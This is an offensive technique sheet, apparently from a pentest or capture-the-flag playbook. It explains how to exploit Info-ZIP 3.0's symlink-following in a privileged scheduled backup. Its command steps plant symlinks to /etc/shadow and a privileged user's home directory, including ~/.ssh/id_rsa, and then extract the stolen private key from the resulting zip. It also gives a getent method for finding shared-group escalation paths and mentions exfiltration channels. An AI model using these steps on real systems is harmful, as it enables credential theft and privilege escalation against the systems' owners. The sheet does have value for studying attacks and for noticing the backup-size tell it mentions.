# info-zip 3.0 Symlink-Follow Privesc

## When this applies

- Target system has Info-ZIP 3.0 with a higher-priv user running `zip --recurse-paths` (no `-y`/`--symlinks`).
- You (low-priv) can write into the source directory the high-priv user zips.
- Common pattern: systemd timer with `OnCalendar=minutely`, `User=<priv-user>`, `ExecStart=/path/to/backup-script`.
- Goal: turn the scheduled backup into an exfil + privesc primitive.

## Technique

Info-ZIP 3.0 with `zip --recurse-paths` (no `-y`/`--symlinks`) **follows symlinks and archives the target's content**, even when the target lives outside the source tree, and even when the target is a directory (zip recurses into it). Plant a symlink in the writable source directory; the next backup zip contains the target file's contents.

## Steps

```bash
# Trigger condition: high-priv user runs `zip --recurse-paths $DST $SRC` where
# you (low-priv) can write to $SRC. Common pattern: systemd timer with
# `OnCalendar=minutely`, User=<priv-user>, ExecStart=/path/to/backup-script.

# As the writer, plant a symlink — pointing to a single file, OR a whole dir
ln -s /home/<priv-user> $SRC/loot         # archive the entire home (incl ~/.ssh/id_rsa)
ln -s /etc/shadow      $SRC/s.txt         # single sensitive file

# Wait one cycle. Read the next backup zip via whatever read primitive you have
# (LFI php://filter, web-served archives, Slack/email exfil, etc.).
unzip -l backup.zip | grep loot           # see exfiltrated tree
unzip -p backup.zip path/to/.ssh/id_rsa > id_rsa
```

The defender-facing tell: backup-zip size flips between minute marks once a directory-symlink is added.

## Group Membership LPE Seam

When you have a foothold as user A and need to escalate to user B, `getent group` is the fastest way to spot a "shared group" privesc:

```bash
getent passwd            # find candidate users (uid >=1000 or service accounts)
getent group             # check every group for "user A is a member of B's group"
                         # OR "user B is a member of A's group" (the reverse — that's the privesc)
```

When **B is a member of A's primary group**, B can read every file owned `A:A_group` with group-read bits — anything you (A) write there is reachable by B. Combine with the zip-symlink trick above (you create a symlink in a writable directory; B's scheduled zip then reaches into B's own files because B can read them) to bridge the gap.

## Verifying success

- After one backup cycle, the resulting zip contains files outside the source tree (verify with `unzip -l <backup.zip>`).
- Extracted file matches the symlinked target's content.

## Common pitfalls

- Info-ZIP 3.0 follows symlinks by default; later versions add `-y`/`--symlinks` flags that store the symlink as-is. Verify the version: `zip -h2 | grep -A1 'symlinks'`.
- Backup zip size flips between minute marks once a directory symlink is added — observable to defenders.
- Read primitive required: you must have a way to retrieve the resulting zip (LFI, web-served archive, exfil channel).

## Tools

- ln (symlink creation)
- unzip
- getent (group enumeration)
